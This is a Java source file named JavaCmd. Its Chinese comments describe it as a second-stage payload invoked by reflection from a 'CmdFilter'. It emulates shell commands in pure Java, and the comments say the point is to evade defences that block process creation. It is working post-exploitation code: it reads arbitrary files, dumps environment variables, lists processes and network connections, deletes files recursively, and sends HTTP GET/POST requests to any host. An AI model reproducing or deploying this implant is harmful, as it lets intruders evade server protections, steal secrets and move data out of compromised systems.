import java.io.*;
import java.lang.management.ManagementFactory;
import java.lang.reflect.Method;
import java.net.*;
import java.nio.charset.StandardCharsets;
import java.nio.file.*;
import java.text.SimpleDateFormat;
import java.util.*;

/**
 * JavaCmd —— 纯 Java 命令模拟器（第二阶段的 payload）。
 *
 * 设计目的：不调用 Runtime.exec / ProcessBuilder，不产生子进程，
 * 只用 java.io / java.nio / java.net 完成“文件、网络、系统信息”的获取与操作，
 * 从而绕过只拦截进程创建的命令执行防护（RASP/disable-exec/容器无 shell 等）。
 *
 * 支持 Unix 与 Windows 的常用内置命令别名：
 *   ls/dir, pwd, whoami, id, hostname, uname/ver, ps/tasklist, cat/type,
 *   head, tail, wc, grep/findstr, find, env/set, date, echo,
 *   mkdir/md, rm/del, cp/copy, mv/move, touch, stat,
 *   ifconfig/ipconfig, netstat, df, du, ping, curl/wget(GET/POST), sleep.
 *
 * 输出上限 256KB，单文件读取上限 2MB；异常以 "ERR: ..." 返回。
 */
public class JavaCmd {
    private static final int MAX_OUT = 256 * 1024;
    private static final long MAX_READ = 2L * 1024 * 1024;
    private static final boolean WINDOWS = System.getProperty("os.name", "").toLowerCase().contains("win");

    public static void main(String[] args) {
        String line = join(args, 0);
        if (line.isEmpty()) line = "help";
        System.out.println(exec(line));
    }

    /** 供 CmdFilter 反射调用的唯一入口。 */
    public static String exec(String commandLine) {
        try {
            List<String> t = tokenize(commandLine);
            if (t.isEmpty()) return "ERR: empty command";
            String cmd = t.get(0).toLowerCase(Locale.ROOT);
            List<String> a = t.subList(1, t.size());

            if (cmd.equals("ls") || cmd.equals("dir")) return ls(a);
            if (cmd.equals("pwd") || cmd.equals("cwd")) return System.getProperty("user.dir");
            if (cmd.equals("whoami")) return whoami();
            if (cmd.equals("id")) return id();
            if (cmd.equals("hostname")) return hostname();
            if (cmd.equals("uname") || cmd.equals("ver")) return uname(a);
            if (cmd.equals("ps") || cmd.equals("tasklist")) return ps();
            if (cmd.equals("cat") || cmd.equals("type") || cmd.equals("more")) return cat(a);
            if (cmd.equals("head")) return headTail(a, true);
            if (cmd.equals("tail")) return headTail(a, false);
            if (cmd.equals("wc")) return wc(a);
            if (cmd.equals("grep") || cmd.equals("findstr")) return grep(a);
            if (cmd.equals("find")) return find(a);
            if (cmd.equals("env") || cmd.equals("set")) return env();
            if (cmd.equals("date")) return date();
            if (cmd.equals("echo") || cmd.equals("print")) return join(a, 0);
            if (cmd.equals("mkdir") || cmd.equals("md")) return mkdir(a);
            if (cmd.equals("rm") || cmd.equals("del") || cmd.equals("rmdir")) return rm(a);
            if (cmd.equals("cp") || cmd.equals("copy")) return cp(a);
            if (cmd.equals("mv") || cmd.equals("move")) return mv(a);
            if (cmd.equals("touch")) return touch(a);
            if (cmd.equals("stat")) return stat(a);
            if (cmd.equals("ifconfig") || cmd.equals("ipconfig") || cmd.equals("ip")) return ifconfig();
            if (cmd.equals("netstat")) return netstat(a);
            if (cmd.equals("df")) return df();
            if (cmd.equals("du")) return du(a);
            if (cmd.equals("ping")) return ping(a);
            if (cmd.equals("curl") || cmd.equals("wget")) return curl(a);
            if (cmd.equals("sleep")) return sleep(a);
            if (cmd.equals("help") || cmd.equals("?")) return help();
            return "ERR: unsupported builtin '" + cmd + "' (java-native mode; use help)";
        } catch (Throwable e) {
            return "ERR: " + e.getClass().getSimpleName() + ": " + e.getMessage();
        }
    }

    // ---------------- 文件 ----------------
    private static String ls(List<String> a) throws Exception {
        boolean longFmt = false;
        String path = ".";
        for (String s : a) {
            if (s.startsWith("-")) {
                if (s.contains("l") || s.contains("a")) longFmt = true;
            } else path = s;
        }
        File d = new File(path);
        if (!d.exists()) return "ERR: no such file or directory: " + path;
        if (d.isFile()) return longFmt ? statLine(d) : d.getName();
        File[] fs = d.listFiles();
        if (fs == null) return "ERR: permission denied: " + path;
        Arrays.sort(fs, new Comparator<File>() {
            public int compare(File x, File y) { return x.getName().compareToIgnoreCase(y.getName()); }
        });
        StringBuilder sb = new StringBuilder();
        for (File f : fs) {
            if (longFmt) sb.append(statLine(f)).append('\n');
            else sb.append(f.getName()).append(f.isDirectory() ? "/" : "").append('\n');
        }
        return sb.toString();
    }

    private static String statLine(File f) {
        String perms = (f.isDirectory() ? "d" : "-") + (f.canRead() ? "r" : "-")
                + (f.canWrite() ? "w" : "-") + (f.canExecute() ? "x" : "-");
        return String.format(Locale.ROOT, "%s %10d %s %s", perms, f.length(),
                new SimpleDateFormat("yyyy-MM-dd HH:mm").format(new Date(f.lastModified())), f.getName());
    }

    private static String cat(List<String> a) throws Exception {
        if (a.isEmpty()) return "ERR: cat <file>";
        StringBuilder sb = new StringBuilder();
        for (String p : a) {
            if (p.startsWith("-")) continue;
            File f = new File(p);
            if (!f.isFile()) { sb.append("ERR: not a file: ").append(p).append('\n'); continue; }
            if (f.length() > MAX_READ) { sb.append("ERR: file too large (>2MB): ").append(p).append('\n'); continue; }
            sb.append(readFile(f));
            if (!sb.toString().endsWith("\n")) sb.append('\n');
        }
        return clamp(sb.toString());
    }

    private static String headTail(List<String> a, boolean head) throws Exception {
        int n = 10;
        String path = null;
        for (int i = 0; i < a.size(); i++) {
            String s = a.get(i);
            if (s.equals("-n") && i + 1 < a.size()) { n = parseInt(a.get(++i), 10); }
            else if (s.matches("-\\d+")) n = parseInt(s.substring(1), 10);
            else if (!s.startsWith("-")) path = s;
        }
        if (path == null) return "ERR: " + (head ? "head" : "tail") + " <file>";
        String[] lines = readFile(new File(path)).split("\n", -1);
        StringBuilder sb = new StringBuilder();
        int start = head ? 0 : Math.max(0, lines.length - n);
        int end = head ? Math.min(n, lines.length) : lines.length;
        for (int i = start; i < end; i++) sb.append(lines[i]).append('\n');
        return clamp(sb.toString());
    }

    private static String wc(List<String> a) throws Exception {
        if (a.isEmpty()) return "ERR: wc <file>";
        long lines = 0, words = 0, bytes = 0;
        for (String p : a) {
            if (p.startsWith("-")) continue;
            String s = readFile(new File(p));
            bytes += s.getBytes(StandardCharsets.UTF_8).length;
            lines += s.split("\n", -1).length;
            words += s.trim().isEmpty() ? 0 : s.trim().split("\\s+").length;
        }
        return String.format(Locale.ROOT, "%d %d %d", lines, words, bytes);
    }

    private static String grep(List<String> a) throws Exception {
        if (a.size() < 2) return "ERR: grep <pattern> <file>";
        String pat = a.get(0);
        File f = new File(a.get(1));
        StringBuilder sb = new StringBuilder();
        for (String line : readFile(f).split("\n")) {
            if (line.contains(pat)) sb.append(line).append('\n');
        }
        return clamp(sb.toString());
    }

    private static String find(List<String> a) throws Exception {
        String root = ".";
        String name = null;
        for (int i = 0; i < a.size(); i++) {
            if (a.get(i).equals("-name") && i + 1 < a.size()) name = a.get(++i);
            else if (!a.get(i).startsWith("-")) root = a.get(i);
        }
        final String match = name;
        final StringBuilder sb = new StringBuilder();
        Files.walkFileTree(Paths.get(root), new SimpleFileVisitor<Path>() {
            public FileVisitResult visitFile(Path p, java.nio.file.attribute.BasicFileAttributes attrs) {
                String n = p.getFileName().toString();
                if (match == null || n.equals(match) || (match.startsWith("*") && match.endsWith("*")
                        && n.contains(match.substring(1, match.length() - 1)))) {
                    sb.append(p.toString()).append('\n');
                }
                return sb.length() > MAX_OUT ? FileVisitResult.TERMINATE : FileVisitResult.CONTINUE;
            }
        });
        return clamp(sb.toString());
    }

    private static String mkdir(List<String> a) {
        StringBuilder sb = new StringBuilder();
        for (String p : a) {
            if (p.startsWith("-")) continue;
            File d = new File(p);
            if (!d.mkdirs() && !d.isDirectory()) sb.append("ERR: mkdir ").append(p).append('\n');
        }
        return sb.length() == 0 ? "ok" : sb.toString();
    }

    private static String rm(List<String> a) {
        StringBuilder sb = new StringBuilder();
        for (String p : a) {
            if (p.startsWith("-")) continue;
            File f = new File(p);
            if (!deleteRecursive(f)) sb.append("ERR: rm ").append(p).append('\n');
        }
        return sb.length() == 0 ? "ok" : sb.toString();
    }

    private static boolean deleteRecursive(File f) {
        if (!f.exists()) return true;
        if (f.isDirectory()) {
            File[] cs = f.listFiles();
            if (cs != null) for (File c : cs) deleteRecursive(c);
        }
        return f.delete();
    }

    private static String cp(List<String> a) throws Exception {
        List<String> pos = new ArrayList<String>();
        for (String s : a) if (!s.startsWith("-")) pos.add(s);
        if (pos.size() != 2) return "ERR: cp <src> <dst>";
        File src = new File(pos.get(0)), dst = new File(pos.get(1));
        if (src.isDirectory()) copyDir(src, dst);
        else copyFile(src, dst);
        return "ok";
    }

    private static void copyFile(File src, File dst) throws IOException {
        if (dst.isDirectory()) dst = new File(dst, src.getName());
        InputStream in = new FileInputStream(src);
        OutputStream out = new FileOutputStream(dst);
        try {
            byte[] buf = new byte[8192]; int n;
            while ((n = in.read(buf)) != -1) out.write(buf, 0, n);
        } finally { in.close(); out.close(); }
    }

    private static void copyDir(File src, File dst) throws IOException {
        if (!dst.exists() && !dst.mkdirs()) throw new IOException("mkdir " + dst);
        File[] cs = src.listFiles();
        if (cs == null) return;
        for (File c : cs) {
            if (c.isDirectory()) copyDir(c, new File(dst, c.getName()));
            else copyFile(c, new File(dst, c.getName()));
        }
    }

    private static String mv(List<String> a) throws Exception {
        List<String> pos = new ArrayList<String>();
        for (String s : a) if (!s.startsWith("-")) pos.add(s);
        if (pos.size() != 2) return "ERR: mv <src> <dst>";
        File src = new File(pos.get(0)), dst = new File(pos.get(1));
        if (dst.isDirectory()) dst = new File(dst, src.getName());
        return src.renameTo(dst) ? "ok" : "ERR: rename failed";
    }

    private static String touch(List<String> a) throws Exception {
        StringBuilder sb = new StringBuilder();
        for (String p : a) {
            if (p.startsWith("-")) continue;
            File f = new File(p);
            if (f.exists()) f.setLastModified(System.currentTimeMillis());
            else if (!f.createNewFile()) sb.append("ERR: touch ").append(p).append('\n');
        }
        return sb.length() == 0 ? "ok" : sb.toString();
    }

    private static String stat(List<String> a) throws Exception {
        if (a.isEmpty()) return "ERR: stat <path>";
        File f = new File(a.get(0));
        if (!f.exists()) return "ERR: no such file: " + a.get(0);
        StringBuilder sb = new StringBuilder();
        sb.append("path: ").append(f.getAbsolutePath()).append('\n');
        sb.append("type: ").append(f.isDirectory() ? "directory" : "file").append('\n');
        sb.append("size: ").append(f.length()).append('\n');
        sb.append("mode: ").append(statLine(f)).append('\n');
        if (Files.isSymbolicLink(f.toPath()))
            sb.append("link: ").append(Files.readSymbolicLink(f.toPath())).append('\n');
        return sb.toString();
    }

    // ---------------- 系统信息 ----------------
    private static String whoami() {
        String u = System.getProperty("user.name", "?");
        String d = System.getProperty("user.domain");
        return d != null && !d.isEmpty() ? d + "\\" + u : u;
    }

    private static String id() {
        String user = System.getProperty("user.name", "?");
        try {
            Class<?> us = Class.forName("com.sun.security.auth.module.UnixSystem");
            Object o = us.getDeclaredConstructor().newInstance();
            long uid = ((Long) us.getMethod("getUid").invoke(o)).longValue();
            long gid = ((Long) us.getMethod("getGid").invoke(o)).longValue();
            long[] groups = (long[]) us.getMethod("getGroups").invoke(o);
            StringBuilder g = new StringBuilder();
            for (int i = 0; i < groups.length; i++) {
                if (i > 0) g.append(',');
                g.append(groups[i]);
            }
            return "uid=" + uid + "(" + user + ") gid=" + gid + " groups=" + g;
        } catch (Throwable t) {
            return "uid=(unknown) user=" + user;
        }
    }

    private static String hostname() {
        String h = System.getenv("HOSTNAME");
        if (h == null || h.isEmpty()) {
            try {
                String s = readFile(new File("/etc/hostname")).trim();
                if (!s.isEmpty()) h = s;
            } catch (Throwable ignored) {}
        }
        if (h == null || h.isEmpty()) {
            try { h = InetAddress.getLocalHost().getHostName(); } catch (Throwable ignored) {}
        }
        return h == null ? "?" : h;
    }

    private static String uname(List<String> a) {
        String os = System.getProperty("os.name", "?");
        String ver = System.getProperty("os.version", "?");
        String arch = System.getProperty("os.arch", "?");
        if (a.isEmpty()) return os;
        return os + " " + hostname() + " " + ver + " " + arch;
    }

    private static String ps() throws Exception {
        if (WINDOWS) {
            String rt = ManagementFactory.getRuntimeMXBean().getName();
            String pid = rt.contains("@") ? rt.substring(0, rt.indexOf('@')) : rt;
            return "PID\tCMD\n" + pid + "\tjava " + System.getProperty("sun.java.command", "?");
        }
        File proc = new File("/proc");
        File[] pids = proc.listFiles(new FilenameFilter() {
            public boolean accept(File d, String n) { return n.matches("\\d+"); }
        });
        StringBuilder sb = new StringBuilder("PID\tPPID\tCMD\n");
        if (pids == null) return sb.toString();
        Arrays.sort(pids, new Comparator<File>() {
            public int compare(File x, File y) { return x.getName().compareTo(y.getName()); }
        });
        for (File p : pids) {
            String cmd = "";
            try {
                cmd = readFile(new File(p, "cmdline")).replace('\0', ' ').trim();
                if (cmd.isEmpty()) cmd = "[" + readFile(new File(p, "comm")).trim() + "]";
            } catch (Throwable ignored) { continue; }
            String ppid = "?";
            try {
                String st = readFile(new File(p, "stat"));
                int rp = st.lastIndexOf(')');
                String[] f = st.substring(rp + 2).split(" ");
                ppid = f[1];
            } catch (Throwable ignored) {}
            sb.append(p.getName()).append('\t').append(ppid).append('\t').append(cmd).append('\n');
            if (sb.length() > MAX_OUT) break;
        }
        return clamp(sb.toString());
    }

    private static String env() {
        List<String> keys = new ArrayList<String>(System.getenv().keySet());
        Collections.sort(keys);
        StringBuilder sb = new StringBuilder();
        for (String k : keys) sb.append(k).append('=').append(System.getenv(k)).append('\n');
        return clamp(sb.toString());
    }

    private static String date() {
        return new SimpleDateFormat("EEE MMM dd HH:mm:ss zzz yyyy", Locale.US).format(new Date());
    }

    // ---------------- 网络 ----------------
    private static String ifconfig() throws Exception {
        StringBuilder sb = new StringBuilder();
        Enumeration<NetworkInterface> es = NetworkInterface.getNetworkInterfaces();
        while (es != null && es.hasMoreElements()) {
            NetworkInterface ni = es.nextElement();
            sb.append(ni.getName()).append(": flags=").append(ni.isUp() ? "UP" : "DOWN")
              .append(" mtu=").append(ni.getMTU());
            byte[] mac = ni.getHardwareAddress();
            if (mac != null && mac.length > 0) {
                sb.append(" mac=");
                for (int i = 0; i < mac.length; i++) {
                    if (i > 0) sb.append(':');
                    sb.append(String.format(Locale.ROOT, "%02x", mac[i] & 0xff));
                }
            }
            sb.append('\n');
            for (InterfaceAddress ia : ni.getInterfaceAddresses()) {
                if (ia.getAddress() != null) {
                    sb.append("  inet ").append(ia.getAddress().getHostAddress())
                      .append('/').append(ia.getNetworkPrefixLength()).append('\n');
                }
            }
        }
        return clamp(sb.toString());
    }

    private static String netstat(List<String> a) throws Exception {
        if (WINDOWS) return "ERR: netstat requires /proc on this platform";
        StringBuilder sb = new StringBuilder("proto local remote state\n");
        for (String proto : new String[]{"tcp", "tcp6", "udp", "udp6"}) {
            File f = new File("/proc/net/" + proto);
            if (!f.isFile()) continue;
            String[] lines = readFile(f).split("\n");
            for (int i = 1; i < lines.length; i++) {
                String[] c = lines[i].trim().split("\\s+");
                if (c.length < 4) continue;
                sb.append(proto).append(' ').append(hexAddr(c[1])).append(' ')
                  .append(hexAddr(c[2])).append(' ').append(c[3]).append('\n');
            }
        }
        return clamp(sb.toString());
    }

    private static String hexAddr(String s) {
        String[] p = s.split(":");
        if (p.length != 2) return s;
        try {
            int port = Integer.parseInt(p[1], 16);
            if (p[0].length() == 8) {
                StringBuilder ip = new StringBuilder();
                for (int i = 6; i >= 0; i -= 2) {
                    ip.append(Integer.parseInt(p[0].substring(i, i + 2), 16));
                    if (i > 0) ip.append('.');
                }
                return ip + ":" + port;
            }
            return p[0] + ":" + port;
        } catch (Throwable t) { return s; }
    }

    private static String ping(List<String> a) throws Exception {
        if (a.isEmpty()) return "ERR: ping <host>";
        String host = a.get(0);
        long t0 = System.currentTimeMillis();
        boolean ok = InetAddress.getByName(host).isReachable(4000);
        return (ok ? "reachable" : "unreachable") + " " + host + " time=" + (System.currentTimeMillis() - t0) + "ms";
    }

    private static String curl(List<String> a) throws Exception {
        String method = "GET";
        String data = null;
        String url = null;
        for (int i = 0; i < a.size(); i++) {
            String s = a.get(i);
            if (s.equals("-X") && i + 1 < a.size()) method = a.get(++i).toUpperCase(Locale.ROOT);
            else if ((s.equals("-d") || s.equals("--data")) && i + 1 < a.size()) { data = a.get(++i); method = "POST"; }
            else if (s.equals("-I")) method = "HEAD";
            else if (!s.startsWith("-")) url = s;
        }
        if (url == null) return "ERR: curl <url>";
        if (!url.contains("://")) url = "http://" + url;
        URLConnection conn = new URL(url).openConnection();
        conn.setConnectTimeout(5000);
        conn.setReadTimeout(8000);
        conn.setRequestProperty("User-Agent", "JavaCmd/1.0");
        if (data != null && !method.equals("GET")) {
            conn.setDoOutput(true);
            OutputStream out = conn.getOutputStream();
            out.write(data.getBytes(StandardCharsets.UTF_8));
            out.close();
        }
        if (conn instanceof HttpURLConnection) ((HttpURLConnection) conn).setRequestMethod(method);
        StringBuilder sb = new StringBuilder();
        if (conn instanceof HttpURLConnection) {
            int code = ((HttpURLConnection) conn).getResponseCode();
            sb.append("HTTP ").append(code).append('\n');
        }
        if (!method.equals("HEAD")) {
            InputStream in = conn.getInputStream();
            sb.append(clampBytes(readAll(in)));
            in.close();
        }
        return clamp(sb.toString());
    }

    private static String sleep(List<String> a) throws Exception {
        if (a.isEmpty()) return "ERR: sleep <seconds>";
        double sec = Double.parseDouble(a.get(0));
        Thread.sleep((long) (sec * 1000));
        return "slept " + sec + "s";
    }

    private static String df() {
        StringBuilder sb = new StringBuilder("Filesystem Size Used Avail Use% Mounted\n");
        for (File root : File.listRoots()) {
            long total = root.getTotalSpace(), free = root.getUsableSpace();
            long used = total - free;
            int pct = total > 0 ? (int) (used * 100 / total) : 0;
            sb.append(root.getAbsolutePath()).append(' ').append(total).append(' ')
              .append(used).append(' ').append(free).append(' ').append(pct).append("%\n");
        }
        return sb.toString();
    }

    private static String du(List<String> a) throws Exception {
        String root = a.isEmpty() ? "." : a.get(0);
        final long[] sum = {0L};
        Files.walkFileTree(Paths.get(root), new SimpleFileVisitor<Path>() {
            public FileVisitResult visitFile(Path p, java.nio.file.attribute.BasicFileAttributes attrs) {
                sum[0] += attrs.size();
                return FileVisitResult.CONTINUE;
            }
        });
        return sum[0] + "\t" + root;
    }

    // ---------------- 工具 ----------------
    private static String readFile(File f) throws IOException {
        if (!f.isFile()) throw new IOException("not a file: " + f);
        if (f.length() > MAX_READ) throw new IOException("file too large: " + f);
        return new String(Files.readAllBytes(f.toPath()), StandardCharsets.UTF_8);
    }

    private static byte[] readAll(InputStream in) throws IOException {
        ByteArrayOutputStream bos = new ByteArrayOutputStream();
        byte[] buf = new byte[8192]; int n;
        while ((n = in.read(buf)) != -1) {
            bos.write(buf, 0, n);
            if (bos.size() > MAX_READ) break;
        }
        return bos.toByteArray();
    }

    private static String clampBytes(byte[] b) {
        String s = new String(b, StandardCharsets.UTF_8);
        return clamp(s);
    }

    private static String clamp(String s) {
        if (s == null) return "";
        return s.length() > MAX_OUT ? s.substring(0, MAX_OUT) + "\n[truncated]" : s;
    }

    private static int parseInt(String s, int def) {
        try { return Integer.parseInt(s); } catch (Throwable t) { return def; }
    }

    private static boolean WINDOWS() { return WINDOWS; }

    private static String join(List<String> a, int from) {
        StringBuilder sb = new StringBuilder();
        for (int i = from; i < a.size(); i++) {
            if (i > from) sb.append(' ');
            sb.append(a.get(i));
        }
        return sb.toString();
    }

    private static String join(String[] a, int from) {
        StringBuilder sb = new StringBuilder();
        for (int i = from; i < a.length; i++) {
            if (i > from) sb.append(' ');
            sb.append(a[i]);
        }
        return sb.toString();
    }

    /** 支持单/双引号的最小 shell 分词器。 */
    private static List<String> tokenize(String s) {
        List<String> out = new ArrayList<String>();
        StringBuilder cur = new StringBuilder();
        boolean quote = false;
        char qc = 0;
        for (int i = 0; i < s.length(); i++) {
            char c = s.charAt(i);
            if (quote) {
                if (c == qc) quote = false;
                else cur.append(c);
            } else if (c == '\'' || c == '"') {
                quote = true; qc = c;
            } else if (Character.isWhitespace(c)) {
                if (cur.length() > 0) { out.add(cur.toString()); cur.setLength(0); }
            } else {
                cur.append(c);
            }
        }
        if (cur.length() > 0) out.add(cur.toString());
        return out;
    }

    private static String help() {
        return "JavaCmd (java-native, no process spawn)\n" +
               "file: ls/dir [-l] [path], pwd, cat/type <f>, head/tail [-n N] <f>, wc <f>,\n" +
               "      grep <pat> <f>, find <dir> -name <glob>, stat <p>, du [dir], df\n" +
               "      mkdir/md, rm/del/rmdir, cp/copy, mv/move, touch\n" +
               "system: whoami, id, hostname, uname/ver [-a], ps/tasklist, env/set, date, echo, sleep N\n" +
               "net: ifconfig/ipconfig, netstat, ping <host>, curl/wget [-X METHOD] [-d data] <url>";
    }
}
